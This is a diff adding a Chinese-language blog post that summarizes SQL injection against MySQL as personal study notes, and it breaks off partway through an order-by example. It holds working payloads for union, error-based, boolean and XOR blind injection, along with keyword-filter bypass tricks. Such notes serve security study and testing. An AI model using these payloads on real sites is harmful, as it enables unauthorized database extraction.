@@ -1,0 +1,1264 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      sql注入知识总结 | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《sql注入知识总结》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/04/25/sql注入知识总结/" itemprop="url">
+		sql注入知识总结
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/04/25/sql注入知识总结/" itemprop="url">
+		<time datetime="2019-04-25T09:05:54.000Z" itemprop="datePublished">
+	  		2019-04-25
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/04/25/sql注入知识总结/" itemprop="url">
+		<time datetime="2019-04-25T09:05:54.000Z" itemprop="dateUpdated">
+	  		2019-05-08
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/知识总结/" class=" ">
+			知识总结
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/04/25/sql注入知识总结/_visitors" data-url="/2019/04/25/sql注入知识总结/" data-title="sql注入知识总结">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/04/25/sql注入知识总结/_likes" data-url="/2019/04/25/sql注入知识总结/" data-title="sql注入知识总结" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近，感觉知识学的有点混乱，来整理一波自己的知识。先总结一下sql注入吧。</p>
+<h3 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h3><h4 id="sql注入中常用到的库和表"><a href="#sql注入中常用到的库和表" class="headerlink" title="sql注入中常用到的库和表"></a>sql注入中常用到的库和表</h4><pre class="line-numbers language-txt"><code class="language-txt">information_schema库
+
+这个数据库中保存着mysql服务器所保存的所有的其他数就库的信息，如数据库名，数据库的表名，表的字段名称和访问权限。
+
+SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
+
+TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
+
+COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。
+
+mysql库
+
+MySQL库中user表中存有所有的MySQL用户信息。
+注意：自MySQL的5.7版本后，密码字段不再是password字段而是authentication_string字段。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="sql注入中常用到的函数"><a href="#sql注入中常用到的函数" class="headerlink" title="sql注入中常用到的函数"></a>sql注入中常用到的函数</h4><pre class="line-numbers language-function"><code class="language-function">database() 返回当前数据库名
+例：select database();
+
+version()  返回MySQL服务器的版本
+例：select version();
+
+user()或 system_user()      返回当前登陆用户名
+例：select user();
+1. system_user() 系统用户名
+2.user() 用户名
+3.current_user() 当前用户
+
+@@datadir    读取数据库路径
+@@basedir   读取数据库安装路径
+@@version_compile_os    读取操作系统信息
+同例：select @@basedir；
+
+load_file()  读取本地文件的函数
+例：select load_files('d:\1.txt'); 
+(注：Linux系统路径是/ windows系统是\)
+
+into outfile   将查询结果导出到本地文件
+例：select * from yang into outfile 'D:\1.txt';
+
+count()  计算表中总的行数
+例：select count(*) from user;
+
+concat(s1,s2,s3,...)  函数返回结果为链接参数产生的字符串，如果有一个参数为null则返回值为null  
+
+substr(s,n,len) 和substring() 和 mid()作用相同；函数表示从字符串s中返回长度为len的字符串，起始位置为n，若n为负值则是从最后开始，输出顺序与原来一样。
+
+Left(string, n )        string为要截取的字符串，n为长度。
+
+length()          返回字符串的字节长度。utf8中，一个汉字是三个字节。
+例：select length('like');
+
+ascii()           返回字符串最左边字符的ascii值。如果字符串为空，返回0。如果字符串为null则返回null。
+例：select asill('like');
+
+sleep(n)   让服务器强制停留n秒后执行。
+例：select  sleep(5);
+
+if(a,b,c)   如果a条件为真，则返回b的值。a条件为假则返回c的值。
+例：select  if(1<2,2,3);
+
+HEX(number)     如果number不是整数，则在进行运算前将其四舍五入为最接近的整数,十六进制数值然后返回该数的表示形式；如果number是NULL，将返回NULL值..如果number是一个字符串，则返回number的十六进制字符串表示形式，其中number里的每个字符被转化为两个十六进制数字
+例：select hex(21);
+
+select hex(21);
+
+CONV(N,from_base,to_base)      N是要转换的数据，from_base是原进制，to_base是目标进制。如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数。
+例：select  conv(20,10,16)；
+
+UPDATEXML (XML_document, XPath_string, new_value); 
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
+第三个参数：new_value，String格式，替换查找到的符合条件的数据 
+作用：改变文档中符合条件的节点的值
+
+EXTRACTVALUE (XML_document, XPath_string);
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+第二个参数：XPath_string (Xpath格式的字符串).
+作用：从目标XML中返回包含所查询值的字符串。
+此函数有长度限制，显示的内容长度最长 32 位。 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>concat(s1,s2,s3,…)<br>函数返回结果为链接参数产生的字符串，如果有一个参数为null则返回值为null<br><a href="https://imgchr.com/i/Eewzm8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/25/Eewzm8.png" alt="Eewzm8.png"></a><br>例：select concat (id, name, score)  from tt2;</p>
+<p>group_concat()             将在同一分组的内内容连接起来，返回一个字符串结果。<br><img src="https://s2.ax1x.com/2019/04/25/Ee0kpn.png" alt="Ee0kpn.png"><br><img src="https://s2.ax1x.com/2019/04/25/Ee0Kk4.png" alt="Ee0Kk4.png"><br><img src="https://s2.ax1x.com/2019/04/25/Ee0Qh9.png" alt="Ee0Qh9.png"></p>
+<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><pre class="line-numbers language-sql"><code class="language-sql">获取所有的数据库库名：<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata
+
+获取某个数据库的所有表名：<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'xxxxx'</span>
+
+获取某个表所有的列名：<span class="token keyword">Select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'xxxxx'</span>
+
+获取某列的内容：<span class="token keyword">Select</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> <span class="token keyword">from</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><p>根据注入手法分：</p>
+<ol>
+<li>联合查询注入</li>
+<li>报错型注入</li>
+<li>盲注</li>
+</ol>
+<ul>
+<li><ol>
+<li>布尔型注入</li>
+<li>基于时间的盲注</li>
+</ol>
+</li>
+</ul>
+<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>条件：需要有显示位。</p>
+<pre><code>例:$sql=select user,pwd from user where id=&#39;$id&#39;;
+
+注入：
+$id=0&#39; union select (database()),&#39;2
+
+首先，用order by 来猜列数
+$id=1&#39; order by 2#
+然后注入。。。
+</code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>条件：显示报错信息</p>
+<p>常用的报错方法：</p>
+<ul>
+<li>floor</li>
+<li>ExtractValue(有长度限制,最长32位)</li>
+<li>UpdateXml(有长度限制,最长32位)</li>
+<li>NAME_CONST(适用于低版本，不太好用)</li>
+<li>Error based Double Query Injection</li>
+<li>exp(5.5.5以上)</li>
+<li>polygon</li>
+</ul>
+<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><p>floor()报错注入准确地说应该是floor,count,group by冲突报错</p>
+<pre class="line-numbers language-sql"><code class="language-sql">表名：
+?id<span class="token operator">=</span><span class="token number">1</span>" <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>table_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
+
+库名：
+?t<span class="token operator">=</span><span class="token number">1111</span><span class="token operator">+</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span>schemata<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token operator">+</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h5><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h5><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h5><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> NAME_CONST<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NAME_CONST<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> x<span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h5><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat_ws<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">having</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h5><pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">""</span><span class="token operator">and</span> <span class="token keyword">polygon</span> <span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//password为某列列名；</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>注：MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>
+<p>根据真假返回的页面不同或响应时间不同可以用来盲注</p>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>布尔盲注主要利用的点在于值的真与假返回的页面内容不同。<br>常见的构造：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正常情况</span>
+' <span class="token keyword">or</span> bool<span class="token shell-comment comment">#</span>
+<span class="token boolean">true</span>' <span class="token keyword">and</span> bool<span class="token shell-comment comment">#</span>
+<span class="token string">' or bool or '</span>
+<span class="token boolean">true</span><span class="token string">' and bool and '</span><span class="token number">1</span>
+' <span class="token keyword">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>bool<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
+
+<span class="token comment" spellcheck="true">//异或盲注</span>
+<span class="token string">'^(bool)='</span><span class="token number">1</span>
+'<span class="token operator">^</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
+
+<span class="token comment" spellcheck="true">//其他</span>
+' <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">case</span> <span class="token function">when</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> then <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> end<span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
+<span class="token string">' or ((bool) in (1)) or '</span><span class="token number">0</span>
+' <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token function">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
+
+常见绕过方式：
+<span class="token keyword">or</span> 可以用 <span class="token operator">||</span>代替或双写或大小写绕过
+<span class="token keyword">and</span> 可以用<span class="token operator">&amp;&amp;</span>代替或双写或大小写绕过
+<span class="token operator">=</span>可以用<span class="token markup">&lt;>代替也可用></span>或<span class="token operator">&lt;</span>比较产生布尔值
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h6 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h6><p>ASCII()、ORD()字符转ASCII<br>CHAR() ASCII转字符<br>一般用来辅助盲注。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">left</span><span class="token punctuation">(</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">'r'</span>  
+<span class="token function">right</span><span class="token punctuation">(</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token string">'r'</span>  
+<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'r'</span>  
+<span class="token function">mid</span><span class="token punctuation">(</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'r'</span> 
+
+<span class="token function">greatest</span><span class="token punctuation">(</span><span class="token string">"ct"</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span> <span class="token string">"ct"</span><span class="token comment" spellcheck="true">////返回最大值再与字符串比较</span>
+<span class="token function">least</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"c"</span><span class="token comment" spellcheck="true">//返回最小值再与字符串比较</span>
+
+<span class="token comment" spellcheck="true">//过滤逗号</span>
+<span class="token function">POSITION</span><span class="token punctuation">(</span><span class="token string">'f'</span> in <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回的是字符的位置第一个字符的返回值是1</span>
+<span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> regexp <span class="token string">'^[a-z]'</span><span class="token comment" spellcheck="true">//正则匹配</span>
+<span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> like <span class="token string">'c%'</span> <span class="token comment" spellcheck="true">//注意%是通配符，建议写脚本的时候时候写到字符集最后面</span>
+<span class="token function">mid</span><span class="token punctuation">(</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> from <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'c'</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>利用order by 盲注的骚姿势</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select * from user where username='' or 1 union select 1,2,3,'1' order by 4;
++----+----------+-------+----------+
+| id | username | money | password |
